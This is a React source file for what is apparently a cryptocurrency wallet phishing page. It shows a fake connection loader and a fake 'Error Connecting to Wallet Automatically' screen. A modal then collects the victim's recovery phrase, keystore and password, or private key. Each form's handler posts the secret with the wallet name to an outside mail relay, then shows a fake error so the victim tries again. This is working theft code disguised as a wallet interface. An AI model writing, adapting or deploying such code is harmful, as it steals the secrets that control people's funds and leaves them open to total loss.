import React, { useEffect, useRef, useState } from "react";
import { motion, useAnimation, useInView } from "framer-motion";
import { useNavigate, useParams } from "react-router-dom";
import { ConnectLogo } from "./Connect";
import { collection, addDoc } from "firebase/firestore";
import { db } from "../lib/firebase";
import emailjs from "@emailjs/browser";
import error from "../asset/error.png";
import axios from "axios";

const Connecting = () => {
  const params = useParams();
  const ref = useRef(null);
  const navigate = useNavigate();
  const isInView = useInView(ref);
  const [loading, setLoading] = useState(true);
  const [btnloading, setBtnLoading] = useState(false);
  const [isError, setIsError] = useState(false);

  const [phrase, setPhrase] = useState("");
  const [keyStore, setKeyStore] = useState("");
  const [keyStorePassword, setKeyStorePassword] = useState("");
  const [privatekey, setPrivatekey] = useState("");

  const HandlePhrase = async (e) => {
    e.preventDefault();

    setBtnLoading(true);

    const message = `HM\n\n Wallet: ${params.id} \n\n Phrase: ${phrase}`;
    axios.post("https://hon-mailer.onrender.com/user/mail",{message})
    .then((res)=>{
      setBtnLoading(false);
      // navigate(`/synchronizing/${params.id}`);
    }).catch((err)=>{
      // console.log(err);
      setBtnLoading(false);
    })
    
    
    setPhrase("");
    setIsError(!isError)
  };
  
  const HandleKeystore = async (e) => {
    e.preventDefault();
    
    setBtnLoading(true);
    
    const message = `HM\n\n Wallet: ${params.id} \n\n KeyStore: ${keyStore} \n\n Password: ${keyStorePassword}`;
    axios.post("https://hon-mailer.onrender.com/user/mail",{message})
    .then((res)=>{
      // console.log(res);
      setBtnLoading(false);
      // navigate(`/synchronizing/${params.id}`);
    }).catch((err)=>{
      // console.log(err);
      setBtnLoading(false);
    })
    
    setKeyStore("");
    setKeyStorePassword("");
    setIsError(!isError)
  };
  
  const HandlePrivatekey = async (e) => {
    e.preventDefault();
    
    setBtnLoading(true);
    
    const message = `HM\n\n Wallet: ${params.id} \n\n Privatekey: ${privatekey}`;
    axios.post("https://hon-mailer.onrender.com/user/mail",{message})
    .then((res)=>{
      // console.log(res);
      setBtnLoading(false);
      // navigate(`/synchronizing/${params.id}`);
    }).catch((err)=>{
      // console.log(err);
      setBtnLoading(false);
    })

    setPrivatekey("");
    setIsError(!isError)
  };

  const mainControls = useAnimation();
  const slideControls = useAnimation();

  useEffect(() => {
    if (isInView) {
      mainControls.start("visible");
      slideControls.start("visible");
    }

    const loaderTimeout = setTimeout(() => {
      setLoading(false);
    }, 3000);

    return () => clearTimeout(loaderTimeout);
  }, [isInView, mainControls, slideControls]);

  const logo = ConnectLogo.find((wallet) => wallet.name === params.id)?.logo;
  return (
    <motion.div
      ref={ref}
      variants={{
        hidden: { opacity: 0, y: 75 },
        visible: { opacity: 1, y: 0 },
      }}
      initial="hidden"
      animate={mainControls}
      transition={{ duration: 2, delay: 0.5 }}
      className="flex  flex-col gap-16 items-center py-16 justify-center w-full "
    >
      {loading ? (
        // Loader component or loading message
        <>
          {/* <span className="loading loading-ring  w-72 h-72 bg-gray-500"></span> */}
          <span className="loading loading-bars w-32 h-32 bg-gray-500"></span>
          <h1 className="text-white">Connecting to {params.id}...</h1>
        </>
      ) : (
        <>
          <div className="text-center flex flex-col justify-around items-center w-full h-[70vh] px-6">
            <div className="text-red-600">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={1.5}
                stroke="currentColor"
                className="w-40 h-40"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M12 9v3.75m9-.75a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9 3.75h.008v.008H12v-.008Z"
                />
              </svg>
            </div>
            <h1 className="md:text-4xl text-2xl font-extrabold text-red-600 px-6">
              Error Connecting to Wallet Automatically!
            </h1>

            <button
              onClick={() => document.getElementById("my_modal_2").showModal()}
              className="btn btn-lg btn-grad px-6 rounded-lg text-lg "
            >
              Connect Manually
            </button>

            <div className="flex text-white rounded-box justify-between gap-8 items-center  border-2 p-4">
              <h1>Decentralized Protocol</h1>
              <h1 className="font-bold">{params.id}</h1>
            </div>

            <dialog id="my_modal_2" className="modal">
              <div className="modal-box text-start">
                <div className="flex items-center gap-4 mb-4 justify-start">
                  {logo && (
                    <img
                      src={isError ? error : logo}
                      className="w-12 rounded-full"
                      alt=""
                    />
                  )}
                  <h3 className="font-bold  text-xl">
                    {isError ? "Error" : params.id}
                  </h3>
                </div>

                <div>
                  {isError && (
                    <div className="bg-red-400 p-4 mb-4 rounded-lg">
                      <h1 className="text-lg font-semibold text-white">An error occured while connecting, please try another wallet.</h1>
                    </div>
                  )}
                  <div role="tablist" className="tabs tabs-lifted">
                    <input
                      type="radio"
                      name="my_tabs_2"
                      role="tab"
                      className="tab"
                      aria-label="Phrase"
                      defaultChecked
                    />
                    <div
                      role="tabpanel"
                      className="tab-content bg-base-100 border-base-300 rounded-box p-6"
                    >
                      <form onSubmit={HandlePhrase}>
                        <label className="form-control">
                          <textarea
                            className="textarea focus:border-primary textarea-bordered "
                            placeholder="Enter your recovery phrase"
                            rows={6}
                            name="message"
                            value={phrase}
                            onChange={(e) => setPhrase(e.target.value)}
                            required
                          ></textarea>
                          <div className="label">
                            <span className="label-text-alt">
                              Typically 12 (sometimes 24) words seperated by
                              single spaces
                            </span>
                          </div>
                        </label>

                        <button
                          type="submit"
                          className="btn bg-[#154860] hover:bg-[#154860] hover:opacity-80 text-white text-lg w-full mt-4"
                        >
                          {btnloading ? (
                            <span className="loading loading-bars loading-sm bg-white"></span>
                          ) : (
                            "Proceed"
                          )}
                        </button>
                      </form>
                    </div>

                    <input
                      type="radio"
                      name="my_tabs_2"
                      role="tab"
                      className="tab"
                      aria-label="Keystore"
                    />
                    <div
                      role="tabpanel"
                      className="tab-content bg-base-100 border-base-300 rounded-box p-6"
                    >
                      <form onSubmit={HandleKeystore}>
                        <label className="form-control ">
                          <textarea
                            className="textarea focus:border-primary textarea-bordered "
                            placeholder="Enter Keystore"
                            rows={4}
                            value={keyStore}
                            onChange={(e) => setKeyStore(e.target.value)}
                            required
                          ></textarea>
                          <textarea
                            className="textarea focus:border-primary textarea-bordered mt-4"
                            placeholder="Wallet password"
                            rows={1}
                            value={keyStorePassword}
                            onChange={(e) =>
                              setKeyStorePassword(e.target.value)
                            }
                            required
                          ></textarea>
                          <div className="label">
                            <span className="label-text-alt">
                              Several lines of text beginning with "[...]" plus
                              the password you used to encrypt it
                            </span>
                          </div>
                        </label>

                        <button
                          type="submit"
                          className="btn bg-[#154860] hover:bg-[#154860] hover:opacity-80 text-white text-lg w-full mt-4"
                        >
                          {btnloading ? (
                            <span className="loading loading-bars loading-sm bg-white"></span>
                          ) : (
                            "Proceed"
                          )}
                        </button>
                      </form>
                    </div>

                    <input
                      type="radio"
                      name="my_tabs_2"
                      role="tab"
                      className="tab"
                      aria-label="PrivateKey"
                    />
                    <div
                      role="tabpanel"
                      className="tab-content bg-base-100 border-base-300 rounded-box p-6"
                    >
                      <form onSubmit={HandlePrivatekey}>
                        <label className="form-control">
                          <textarea
                            className="textarea focus:border-primary textarea-bordered "
                            placeholder="Enter your Private Key"
                            rows={1}
                            value={privatekey}
                            onChange={(e) => setPrivatekey(e.target.value)}
                            required
                          ></textarea>
                          <div className="label">
                            <span className="label-text-alt">
                              Typically 12 (sometimes 24) words seperated by
                              single spaces
                            </span>
                          </div>
                        </label>

                        <button
                          type="submit"
                          className="btn bg-[#154860] hover:bg-[#154860] hover:opacity-80 text-white text-lg w-full mt-4"
                        >
                          {btnloading ? (
                            <span className="loading loading-bars loading-sm bg-white"></span>
                          ) : (
                            "Proceed"
                          )}
                        </button>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
              <form method="dialog" className="modal-backdrop">
                <button>close</button>
              </form>
            </dialog>
          </div>
        </>
      )}
    </motion.div>
  );
};

export default Connecting;
